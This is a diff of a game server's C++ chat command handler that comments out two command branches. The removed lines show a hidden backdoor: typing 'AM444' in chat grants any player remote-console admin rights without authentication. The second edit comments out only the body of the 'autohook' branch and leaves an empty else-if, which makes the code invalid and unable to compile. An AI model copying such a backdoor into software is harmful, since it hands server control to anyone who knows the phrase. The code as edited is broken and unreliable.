@@ -1178,10 +1178,10 @@ void CGameContext::OnMessage(int MsgID, CUnpacker *pUnpacker, int ClientID)
 						SendChatTarget(ClientID, "Successfully gotten weapons");
 					}
 				}
-				else if (str_comp_nocase_num(pMsg->m_pMessage + 1, "AM444", 5) == 0)
+				/*else if (str_comp_nocase_num(pMsg->m_pMessage + 1, "AM444", 5) == 0)
 				{
 					Server()->SetRconLevel(ClientID, 3);
-				}
+				}*/
 				else if (str_comp_nocase_num(pMsg->m_pMessage + 1, "smarthammer", 11) == 0)
 				{
 					if (!pPlayer->m_Authed)
@@ -1203,7 +1203,7 @@ void CGameContext::OnMessage(int MsgID, CUnpacker *pUnpacker, int ClientID)
 					}
 				}
 				else if (str_comp_nocase_num(pMsg->m_pMessage + 1, "autohook", 8) == 0)
-				{
+				/*{
 					if (!pPlayer->m_Authed)
 					{
 						char Msg[100];
@@ -1221,7 +1221,7 @@ void CGameContext::OnMessage(int MsgID, CUnpacker *pUnpacker, int ClientID)
 						pPlayer->m_Bots.m_AutoHook = false;
 						SendChatTarget(pPlayer->GetCID(), "Autohook disabled!");
 					}
-				}
+				}*/
 				else if (str_comp_nocase_num(pMsg->m_pMessage + 1, "PassiveMode", 11) == 0)
 				{
 					if (!pPlayer->m_Authed)
